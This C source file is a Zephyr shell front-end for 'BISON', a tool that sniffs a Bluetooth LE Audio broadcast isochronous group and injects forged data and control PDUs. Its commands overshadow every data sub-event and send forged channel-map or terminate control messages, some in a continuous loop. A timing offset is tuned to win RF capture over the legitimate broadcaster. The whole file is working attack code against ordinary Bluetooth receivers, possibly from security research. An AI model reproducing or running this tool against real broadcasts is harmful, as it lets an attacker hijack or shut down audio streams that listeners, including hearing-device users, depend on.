/*
 * Shell front-end for the BISON helpers.
 *
 *   bison status
 *     Dump the current BIS-sniff snapshot.
 *
 *   bison tx <evt_offset> <bis> <intra_se> <llid> [hex_pdu]
 *     Fire one forged sub-event TX. cssn defaults to snap.cssn_curr
 *     and cstf=0, matching a normal broadcast data PDU.
 *
 *   bison ctrl <evt_offset> <ctrl_hex>
 *     Inject a BIG Control PDU. Enqueues two same-event TXes:
 *       (a) one signal data PDU on (bis=1, se=0) with cstf=1 and
 *           cssn=(cssn_data_last+1)&7 - the "control subevent coming"
 *           signal the spec requires (Vol 6 Part B 4.4.6.5).
 *       (b) the CTRL PDU on the control subevent (bis=0) carrying
 *           the caller-supplied opcode+arg bytes.
 *     Sufficient for Zephyr-based receivers. Some vendor stacks
 *     appear to require the cstf=1 signal on every data sub-event
 *     of the event, not just one - see `bison ctrl_all`.
 *
 *   bison ctrl_all <evt_offset> <ctrl_hex>
 *     Same intent as `bison ctrl` but overshadows *every* data
 *     sub-event of the target BIG event with a cstf=1 signal PDU,
 *     then the CTRL PDU on the control subevent. Enqueues
 *     `num_bis * nse_data + 1` entries. Ordered by wire time so the
 *     chained-arm path arms them monotonically.
 *
 *   bison ctrl_loop <ctrl_hex>
 *     Continuously do `ctrl_all` every BIG event until stopped with
 *     `bison ctrl_stop`. For CHAN_MAP_IND (0x00) and TERMINATE_IND
 *     (0x01) opcodes the `instant` field is re-anchored to
 *     `target_evt + 6` on every iteration so it stays in the future
 *     across arbitrary attack durations. Use this when a single
 *     `ctrl_all` doesn't win RF capture-effect on all sub-events
 *     simultaneously - over many events the statistics accumulate.
 *
 *   bison ctrl_stop
 *     Stop `bison ctrl_loop`. Prints iters_run / iters_ok totals.
 *
 *   bison early [<us>]
 *     Get / set the early-fire offset. When set, every hijack TX
 *     fires <us> microseconds sooner than the spec-correct anchor
 *     offset. Used to bias RF capture-effect in our favour when
 *     we're overshadowing a legitimate broadcaster on the same
 *     slot: at the receiver, whichever preamble+AA arrives first
 *     wins the AGC lock. Because we snap our anchor from observing
 *     the broadcaster's TX, we're inherently ~5-10us late; a
 *     small positive early_us cancels that latency plus a safety
 *     margin. Typical productive values: 10-50us. Range 0..500us.
 *
 *   ctrl_hex is a hex string of "opcode || arg", e.g.
 *       00<5-byte-chm><le16-instant>   CHAN_MAP_IND
 *       01<reason><le16-instant>       TERMINATE_IND
 */

#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#include <zephyr/kernel.h>
#include <zephyr/random/random.h>
#include <zephyr/shell/shell.h>
#include <zephyr/sys/util.h>

#include "hal/ticker.h"
#include "ticker/ticker.h"
#include "util/util.h"

#include "pdu_df.h"
#include "lll/pdu_vendor.h"
#include "pdu.h"

#include "bison_sniff.h"
#include "bison_subevent_time.h"
#include "bison_tx.h"
#include "bison_lll_hijack.h"

#include "scan.h"
#include "big_sync.h"

static uint8_t last_injected_cssn;
static bool    last_injected_cssn_valid;

/* Bogus PDU payload for cstf=1 injection */
#define BISON_SIGNAL_PAYLOAD_LEN 5U
static const uint8_t bison_signal_payload[BISON_SIGNAL_PAYLOAD_LEN] = {
	'B', 'I', 'S', 'O', 'N'
};

/* Estimate the BIG event counter that's "current" right now, given a
 * snapshot from some past event. anchor_ticks is in HAL ticker units.
 */
static uint16_t current_event_counter(const struct bison_snapshot *snap)
{
	uint32_t now;
	uint32_t elapsed_ticks;
	uint32_t iso_interval_ticks;
	uint32_t events_elapsed;

	now = ticker_ticks_now_get();
	elapsed_ticks = now - snap->anchor_ticks;
	iso_interval_ticks =
		HAL_TICKER_US_TO_TICKS((uint32_t)snap->iso_interval * 1250U);
	if (iso_interval_ticks == 0U) {
		return snap->event_counter;
	}
	events_elapsed = elapsed_ticks / iso_interval_ticks;
	return (uint16_t)(snap->event_counter + events_elapsed);
}

static void dump_snapshot(const struct shell *sh,
			  const struct bison_snapshot *snap)
{
	shell_print(sh,
		"seed_aa      : %02x %02x %02x %02x",
		snap->seed_access_addr[0], snap->seed_access_addr[1],
		snap->seed_access_addr[2], snap->seed_access_addr[3]);
	shell_print(sh,
		"base_crc_init: %02x %02x",
		snap->base_crc_init[0], snap->base_crc_init[1]);
	shell_print(sh,
		"iso_interval : %u (1.25 ms units) = %u us",
		snap->iso_interval, snap->iso_interval * 1250U);
	shell_print(sh,
		"sub_interval : %u us",
		snap->sub_interval_us);
	shell_print(sh,
		"bis_spacing  : %u us",
		snap->bis_spacing_us);
	shell_print(sh,
		"packing      : %s",
		bison_is_sequential_packing(snap->bis_spacing_us,
					    snap->sub_interval_us,
					    snap->nse) ?
				"sequential" : "interleaved");
	shell_print(sh,
		"num_bis=%u nse=%u bn=%u irc=%u pto=%u phy=%u "
		"framing=%u encrypted=%u max_pdu=%u",
		snap->num_bis, snap->nse, snap->bn, snap->irc, snap->pto,
		snap->phy, snap->framing, snap->encrypted, snap->max_pdu);
	shell_print(sh,
		"chan_map     : %02x %02x %02x %02x %02x (count=%u)",
		snap->data_chan_map[0], snap->data_chan_map[1],
		snap->data_chan_map[2], snap->data_chan_map[3],
		snap->data_chan_map[4], snap->data_chan_count);
	if (snap->chm_update_pending) {
		shell_print(sh,
			"chm_pending  : %02x %02x %02x %02x %02x "
			"(count=%u) instant=%u",
			snap->chm_chan_map[0], snap->chm_chan_map[1],
			snap->chm_chan_map[2], snap->chm_chan_map[3],
			snap->chm_chan_map[4],
			snap->chm_chan_count, snap->ctrl_instant);
	}
	shell_print(sh,
		"payload_count: %llu  event_counter: %u  anchor_ticks: %u",
		(unsigned long long)snap->payload_count,
		snap->event_counter, snap->anchor_ticks);
	shell_print(sh,
		"cssn         : curr=%u  next=%u  data_last=%u  "
		"(last data-PDU hdr byte seen: 0x%02x)",
		snap->cssn_curr, snap->cssn_next, snap->cssn_data_last,
		snap->pdu_hdr_last_byte);
	shell_print(sh,
		"snoops       : data_pdus=%u  cstf=%u  "
		"(if data_pdus is stuck, we're not RXing and "
		"data_last is stale)",
		snap->data_pdu_snoop_count, snap->cstf_observed_count);
	shell_print(sh,
		"hijack       : fired=%u  chain_armed=%u  tx_done=%u",
		snap->hijack_fired_count, snap->hijack_chain_armed_count,
		snap->hijack_tx_done_count);
	if (snap->hijack_chain_armed_count > 0U) {
		shell_print(sh,
			"last chain   : start_us=%u  chan=%u  "
			"aa=%02x%02x%02x%02x",
			snap->hijack_last_chain_start_us,
			snap->hijack_last_chain_chan,
			snap->hijack_last_chain_aa[3],
			snap->hijack_last_chain_aa[2],
			snap->hijack_last_chain_aa[1],
			snap->hijack_last_chain_aa[0]);
	}
	if (last_injected_cssn_valid) {
		shell_print(sh,
			"last_injected: cssn=%u  (informational only - not "
			"merged into base since it drifts with a stale sniff)",
			last_injected_cssn);
	}
	shell_print(sh,
		"bisquit      : bypass=%s",
		bison_lll_hijack_bisquit_bypass_get() ? "on" : "off");
}

static int cmd_status(const struct shell *sh, size_t argc, char **argv)
{
	struct bison_snapshot snap;

	ARG_UNUSED(argc);
	ARG_UNUSED(argv);

	if (!bison_sniff_snapshot(&snap)) {
		shell_warn(sh, "no snapshot yet - `bison sync [<target>]` first");
		return -ENOENT;
	}

	dump_snapshot(sh, &snap);
	return 0;
}


static int cmd_tx(const struct shell *sh, size_t argc, char **argv)
{
	struct bison_snapshot snap;
	uint8_t pdu[251];
	size_t pdu_len = 0U;
	long evt_offset;
	long bis_index;
	long intra_se;
	long llid;
	uint16_t target_evt;
	int err;

	if (argc < 5 || argc > 6) {
		shell_error(sh, "usage: bison tx <evt_offset> <bis_index> "
				"<intra_se_idx> <llid> [hex_pdu]");
		return -EINVAL;
	}

	evt_offset = strtol(argv[1], NULL, 0);
	bis_index  = strtol(argv[2], NULL, 0);
	intra_se   = strtol(argv[3], NULL, 0);
	llid       = strtol(argv[4], NULL, 0);

	if (argc == 6) {
		size_t hexlen = strlen(argv[5]);

		if (hexlen & 1U) {
			shell_error(sh, "hex_pdu must have even length");
			return -EINVAL;
		}
		pdu_len = hex2bin(argv[5], hexlen, pdu, sizeof(pdu));
		if (pdu_len == 0U && hexlen > 0U) {
			shell_error(sh, "bad hex_pdu");
			return -EINVAL;
		}
	}

	if (!bison_sniff_snapshot(&snap)) {
		shell_warn(sh, "no snapshot yet - `bison sync [<target>]` first");
		return -ENOENT;
	}

	target_evt = (uint16_t)(current_event_counter(&snap) + evt_offset);

	err = bison_tx_schedule(target_evt, (uint8_t)bis_index,
				(uint8_t)intra_se, (uint8_t)llid,
				snap.cssn_data_last, 0U,
				pdu_len ? pdu : NULL, (uint8_t)pdu_len);
	if (err) {
		shell_error(sh, "schedule failed (%d)", err);
		return err;
	}
	shell_print(sh, "scheduled - watch the log for fire confirmation");
	return 0;
}

static int cmd_ctrl(const struct shell *sh, size_t argc, char **argv)
{
	struct bison_snapshot snap;
	uint8_t ctrl_pdu[251];
	size_t ctrl_len;
	long evt_offset;
	uint16_t target_evt;
	uint8_t next_cssn;
	uint8_t base_cssn;
	size_t hexlen;
	int err;

	if (argc != 3) {
		shell_error(sh, "usage: bison ctrl <evt_offset> <ctrl_hex>");
		return -EINVAL;
	}

	evt_offset = strtol(argv[1], NULL, 0);

	hexlen = strlen(argv[2]);
	if (hexlen < 2U || (hexlen & 1U)) {
		shell_error(sh, "ctrl_hex must be non-empty and even length "
				"(opcode byte + arg bytes)");
		return -EINVAL;
	}
	ctrl_len = hex2bin(argv[2], hexlen, ctrl_pdu, sizeof(ctrl_pdu));
	if (ctrl_len == 0U) {
		shell_error(sh, "bad ctrl_hex");
		return -EINVAL;
	}

	if (!bison_sniff_snapshot(&snap)) {
		shell_warn(sh, "no snapshot yet - `bison sync [<target>]` first");
		return -ENOENT;
	}

	target_evt = (uint16_t)(current_event_counter(&snap) + evt_offset);

	base_cssn = snap.cssn_data_last;
	next_cssn = (uint8_t)((base_cssn + 1U) & 0x7U);

	err = bison_tx_schedule(target_evt, 1U, 0U,
				BISON_TX_LLID_COMPLETE_END,
				next_cssn, 1U,
				bison_signal_payload, BISON_SIGNAL_PAYLOAD_LEN);
	if (err) {
		shell_error(sh, "signal PDU enqueue failed (%d)", err);
		return err;
	}

	err = bison_tx_schedule(target_evt, 0U, 0U,
				BISON_TX_LLID_CTRL,
				next_cssn, 0U,
				ctrl_pdu, (uint8_t)ctrl_len);
	if (err) {
		shell_error(sh, "CTRL PDU enqueue failed (%d)", err);
		return err;
	}

	last_injected_cssn = next_cssn;
	last_injected_cssn_valid = true;

	{
		uint8_t signal_aa[4];
		uint8_t ctrl_aa[4];

		util_bis_aa_le32(1U, (uint8_t *)snap.seed_access_addr, signal_aa);
		util_bis_aa_le32(0U, (uint8_t *)snap.seed_access_addr, ctrl_aa);
		shell_print(sh,
			"CTRL injection queued: evt=%u cssn=%u opcode=0x%02x "
			"(%u byte(s))",
			target_evt, next_cssn, ctrl_pdu[0], (unsigned)ctrl_len);
		shell_print(sh,
			"  signal PDU on BIS[1] AA %02x%02x%02x%02x (payload "
			"BISON)",
			signal_aa[3], signal_aa[2], signal_aa[1], signal_aa[0]);
		shell_print(sh,
			"  CTRL PDU  on CTRL   AA %02x%02x%02x%02x - configure "
			"your sniffer to also capture this AA",
			ctrl_aa[3], ctrl_aa[2], ctrl_aa[1], ctrl_aa[0]);
	}
	return 0;
}

static int enqueue_flood_data_pdus(const struct bison_snapshot *snap,
				   uint16_t target_evt, uint8_t cssn,
				   uint8_t cstf,
				   const uint8_t *payload, uint8_t payload_len)
{
	uint32_t nse_data;
	uint8_t max_bis;
	uint8_t max_se;
	uint8_t outer_max;
	uint8_t inner_max;
	bool outer_is_se;
	int enqueued = 0;
	int err;

	nse_data = (uint32_t)snap->bn * snap->irc +
		   (snap->pto ? snap->bn : 0U);
	max_bis = snap->num_bis;
	max_se  = (uint8_t)nse_data;
	outer_is_se = !bison_is_sequential_packing(snap->bis_spacing_us,
						   snap->sub_interval_us,
						   max_se);
	outer_max = outer_is_se ? max_se : max_bis;
	inner_max = outer_is_se ? max_bis : max_se;

	for (uint8_t outer = 0U; outer < outer_max; outer++) {
		for (uint8_t inner = 0U; inner < inner_max; inner++) {
			uint8_t bis = outer_is_se ? (inner + 1U) : (outer + 1U);
			uint8_t se  = outer_is_se ? outer : inner;

			err = bison_tx_schedule(target_evt, bis, se,
				BISON_TX_LLID_COMPLETE_END,
				cssn, cstf, payload, payload_len);
			if (err) {
				return err;
			}
			enqueued++;
		}
	}

	return enqueued;
}

static int enqueue_ctrl_all(const struct bison_snapshot *snap,
			    uint16_t target_evt, uint8_t next_cssn,
			    const uint8_t *ctrl_pdu, uint8_t ctrl_len)
{
	uint32_t nse_data = (uint32_t)snap->bn * snap->irc +
			    (snap->pto ? snap->bn : 0U);
	int total_entries = (int)((uint32_t)snap->num_bis * nse_data) + 1;
	int signals;
	int err;

	if (bison_lll_hijack_available() < total_entries) {
		return -ENOSPC;
	}

	signals = enqueue_flood_data_pdus(snap, target_evt, next_cssn, 1U,
					  bison_signal_payload,
					  BISON_SIGNAL_PAYLOAD_LEN);
	if (signals < 0) {
		return signals;
	}

	err = bison_tx_schedule(target_evt, 0U, 0U,
				BISON_TX_LLID_CTRL,
				next_cssn, 0U,
				ctrl_pdu, ctrl_len);
	if (err) {
		return err;
	}

	return signals;
}

static int cmd_ctrl_all(const struct shell *sh, size_t argc, char **argv)
{
	struct bison_snapshot snap;
	uint8_t ctrl_pdu[251];
	size_t ctrl_len;
	long evt_offset;
	uint16_t target_evt;
	uint8_t next_cssn;
	size_t hexlen;
	int signals;

	if (argc != 3) {
		shell_error(sh, "usage: bison ctrl_all <evt_offset> <ctrl_hex>");
		return -EINVAL;
	}

	evt_offset = strtol(argv[1], NULL, 0);

	hexlen = strlen(argv[2]);
	if (hexlen < 2U || (hexlen & 1U)) {
		shell_error(sh, "ctrl_hex must be non-empty and even length");
		return -EINVAL;
	}
	ctrl_len = hex2bin(argv[2], hexlen, ctrl_pdu, sizeof(ctrl_pdu));
	if (ctrl_len == 0U) {
		shell_error(sh, "bad ctrl_hex");
		return -EINVAL;
	}

	if (!bison_sniff_snapshot(&snap)) {
		shell_warn(sh, "no snapshot yet - `bison sync [<target>]` first");
		return -ENOENT;
	}

	target_evt = (uint16_t)(current_event_counter(&snap) + evt_offset);
	next_cssn = (uint8_t)((snap.cssn_data_last + 1U) & 0x7U);

	signals = enqueue_ctrl_all(&snap, target_evt, next_cssn,
				    ctrl_pdu, (uint8_t)ctrl_len);
	if (signals < 0) {
		if (signals == -ENOSPC) {
			shell_error(sh,
				"queue too full: %d slot(s) free "
				"(reduce injection frequency or wait)",
				bison_lll_hijack_available());
		} else {
			shell_error(sh, "enqueue failed (%d)", signals);
		}
		return signals;
	}

	last_injected_cssn = next_cssn;
	last_injected_cssn_valid = true;

	{
		uint8_t ctrl_aa[4];

		util_bis_aa_le32(0U, (uint8_t *)snap.seed_access_addr, ctrl_aa);
		shell_print(sh,
			"CTRL-all injection queued: evt=%u cssn=%u "
			"opcode=0x%02x (%u byte(s))  signals=%d",
			target_evt, next_cssn, ctrl_pdu[0],
			(unsigned)ctrl_len, signals);
		shell_print(sh,
			"  signal PDUs on every data sub-event of "
			"BIS[1..%u] with cstf=1",
			snap.num_bis);
		shell_print(sh,
			"  CTRL PDU on CTRL AA %02x%02x%02x%02x",
			ctrl_aa[3], ctrl_aa[2], ctrl_aa[1], ctrl_aa[0]);
	}
	return 0;
}

/* Continuous ctrl_all: keeps re-attacking every BIG event until stopped.
 *
 * Every iso_interval the workqueue handler enqueues a fresh flood
 * (num_bis * nse_data + 1 entries) targeting the next-but-one event
 * (current + 2). If a CHAN_MAP_IND or TERMINATE_IND opcode has an
 * instant field, we re-anchor it to `target_evt + LOOP_INSTANT_DELTA`
 * on every iteration so the receiver's "instant must be in the future"
 * check keeps passing even if it takes many events for our injection
 * to win capture-effect.
 */
#define LOOP_INSTANT_DELTA 6U

static void ctrl_loop_work_handler(struct k_work *work);
static K_WORK_DELAYABLE_DEFINE(ctrl_loop_work, ctrl_loop_work_handler);

static uint8_t                 ctrl_loop_pdu[251];
static uint8_t                 ctrl_loop_len;
static uint16_t                ctrl_loop_iso_ms;
static bool                    ctrl_loop_active;
static uint32_t                ctrl_loop_iters_run;
static uint32_t                ctrl_loop_iters_ok;

static void ctrl_loop_work_handler(struct k_work *work)
{
	struct bison_snapshot snap;
	uint16_t target_evt;
	uint16_t instant;
	uint8_t next_cssn;
	int signals;

	ARG_UNUSED(work);

	if (!ctrl_loop_active) {
		return;
	}

	if (!bison_sniff_snapshot(&snap)) {
		(void)k_work_reschedule(&ctrl_loop_work, K_MSEC(50));
		return;
	}

	ctrl_loop_iters_run++;

	target_evt = (uint16_t)(current_event_counter(&snap) + 2U);
	next_cssn  = (uint8_t)((snap.cssn_data_last + 1U) & 0x7U);

	instant = (uint16_t)(target_evt + LOOP_INSTANT_DELTA);
	switch (ctrl_loop_pdu[0]) {
	case 0x00:
		if (ctrl_loop_len >= 8U) {
			ctrl_loop_pdu[6] = (uint8_t)(instant & 0xffU);
			ctrl_loop_pdu[7] = (uint8_t)((instant >> 8) & 0xffU);
		}
		break;
	case 0x01:
		if (ctrl_loop_len >= 4U) {
			ctrl_loop_pdu[2] = (uint8_t)(instant & 0xffU);
			ctrl_loop_pdu[3] = (uint8_t)((instant >> 8) & 0xffU);
		}
		break;
	default:
		break;
	}

	signals = enqueue_ctrl_all(&snap, target_evt, next_cssn,
				   ctrl_loop_pdu, ctrl_loop_len);
	if (signals >= 0) {
		ctrl_loop_iters_ok++;
		last_injected_cssn = next_cssn;
		last_injected_cssn_valid = true;
	}

	(void)k_work_reschedule(&ctrl_loop_work, K_MSEC(ctrl_loop_iso_ms));
}

static int cmd_ctrl_loop(const struct shell *sh, size_t argc, char **argv)
{
	struct bison_snapshot snap;
	size_t hexlen;
	size_t len;

	if (argc != 2) {
		shell_error(sh, "usage: bison ctrl_loop <ctrl_hex>");
		return -EINVAL;
	}
	if (ctrl_loop_active) {
		shell_warn(sh, "ctrl_loop already running - run "
				"`bison ctrl_stop` first");
		return -EALREADY;
	}

	hexlen = strlen(argv[1]);
	if (hexlen < 2U || (hexlen & 1U)) {
		shell_error(sh, "ctrl_hex must be non-empty and even length");
		return -EINVAL;
	}
	len = hex2bin(argv[1], hexlen, ctrl_loop_pdu, sizeof(ctrl_loop_pdu));
	if (len == 0U) {
		shell_error(sh, "bad ctrl_hex");
		return -EINVAL;
	}
	ctrl_loop_len = (uint8_t)len;

	if (!bison_sniff_snapshot(&snap)) {
		shell_warn(sh, "no snapshot yet - `bison sync [<target>]` first");
		return -ENOENT;
	}

	/* iso_interval is in 1.25 ms units. 24 -> 30 ms. */
	ctrl_loop_iso_ms = (uint16_t)(((uint32_t)snap.iso_interval * 1250U) /
				      1000U);
	ctrl_loop_iters_run = 0U;
	ctrl_loop_iters_ok  = 0U;
	ctrl_loop_active    = true;

	(void)k_work_reschedule(&ctrl_loop_work, K_NO_WAIT);

	shell_print(sh,
		"ctrl_loop started: iso_interval=%ums, opcode=0x%02x "
		"(%u byte(s)), instant auto-refreshed to target+%u each iter",
		ctrl_loop_iso_ms, ctrl_loop_pdu[0],
		(unsigned)ctrl_loop_len, LOOP_INSTANT_DELTA);
	shell_print(sh, "Watch `bison status` for hijack:tx_done growth. "
			"`bison ctrl_stop` to stop.");
	return 0;
}

static int cmd_ctrl_stop(const struct shell *sh, size_t argc, char **argv)
{
	ARG_UNUSED(argc);
	ARG_UNUSED(argv);

	if (!ctrl_loop_active) {
		shell_warn(sh, "ctrl_loop is not running");
		return -EALREADY;
	}

	ctrl_loop_active = false;
	(void)k_work_cancel_delayable(&ctrl_loop_work);

	shell_print(sh,
		"ctrl_loop stopped: iters_run=%u iters_ok=%u "
		"(dropped=%u to queue backpressure)",
		ctrl_loop_iters_run, ctrl_loop_iters_ok,
		ctrl_loop_iters_run - ctrl_loop_iters_ok);
	return 0;
}


static int cmd_early(const struct shell *sh, size_t argc, char **argv)
{
	long us;

	if (argc == 1) {
		shell_print(sh,
			"current early-fire offset: %u us",
			bison_lll_hijack_get_early_us());
		return 0;
	}
	if (argc != 2) {
		shell_error(sh, "usage: bison early [<us>]");
		return -EINVAL;
	}

	us = strtol(argv[1], NULL, 0);
	if (us < 0 || us > 500) {
		shell_error(sh,
			"early offset must be 0..500 us "
			"(receiver window ~100us; values above ~200us "
			"start missing entirely)");
		return -EINVAL;
	}

	bison_lll_hijack_set_early_us((uint32_t)us);
	shell_print(sh,
		"early-fire offset set to %ld us. Every hijack event now "
		"fires that much sooner - biases RF capture-effect if "
		"we're competing with the legitimate broadcaster on the "
		"same slot.",
		us);
	return 0;
}

static int cmd_bison_sync(const struct shell *sh, size_t argc, char **argv)
{
	struct sniffer_candidate cand;
	const char *tok = (argc >= 2) ? argv[1] : NULL;
	int err;

	err = sniffer_scan_lookup(tok, &cand);
	if (err) {
		if (tok == NULL) {
			shell_error(sh, "no candidates - `scan on` first");
		} else {
			shell_error(sh, "no matching candidate for '%s' - "
					"`scan list` to see options", tok);
		}
		return err;
	}

	char addr_str[BT_ADDR_LE_STR_LEN];

	bt_addr_le_to_str(&cand.addr, addr_str, sizeof(addr_str));
	shell_print(sh, "bison sync: locking on %s sid=%u name='%s'",
		    addr_str, cand.sid, cand.name);

	err = big_sync_start(&cand,
			     cand.bcode_len ? cand.bcode : NULL,
			     cand.bcode_len,
			     sh);
	if (err) {
		shell_error(sh, "bison sync failed: %d", err);
		return err;
	}
	shell_print(sh, "bison sync up - `bison status` now has a live snapshot");
	return 0;
}

static int cmd_bison_unsync(const struct shell *sh, size_t argc, char **argv)
{
	ARG_UNUSED(argc);
	ARG_UNUSED(argv);

	if (!big_sync_is_active()) {
		shell_warn(sh, "bison sync not running");
		return 0;
	}
	(void)big_sync_stop();
	shell_print(sh, "bison sync torn down");
	return 0;
}

SHELL_STATIC_SUBCMD_SET_CREATE(sub_bison,
	SHELL_CMD_ARG(sync, NULL,
		      "[<target>] - PA + BIG sync so the snapshot populates",
		      cmd_bison_sync, 1, 1),
	SHELL_CMD(unsync, NULL,
		  "Tear down the bison sync",
		  cmd_bison_unsync),
	SHELL_CMD(status, NULL,
		  "Dump the current BIS-sniff snapshot",
		  cmd_status),
	SHELL_CMD(tx, NULL,
		  "Schedule forged TX: <evt_offset> <bis> <intra_se> "
		  "<llid> [hex_pdu]",
		  cmd_tx),
	SHELL_CMD(ctrl, NULL,
		  "Inject a BIG Control PDU (1 signal + CTRL): "
		  "<evt_offset> <ctrl_hex>",
		  cmd_ctrl),
	SHELL_CMD(ctrl_all, NULL,
		  "Inject BIG Control PDU with cstf=1 on ALL data "
		  "sub-events: <evt_offset> <ctrl_hex>",
		  cmd_ctrl_all),
	SHELL_CMD(ctrl_loop, NULL,
		  "Continuously do ctrl_all every event (instant "
		  "auto-refreshed): <ctrl_hex>",
		  cmd_ctrl_loop),
	SHELL_CMD(ctrl_stop, NULL,
		  "Stop `bison ctrl_loop`",
		  cmd_ctrl_stop),
	SHELL_CMD(early, NULL,
		  "Get / set the early-fire offset in us (biases RF "
		  "capture-effect): [<us>]",
		  cmd_early),
	SHELL_SUBCMD_SET_END
);

SHELL_CMD_REGISTER(bison, &sub_bison, "BISON BIS-hijack helpers", NULL);
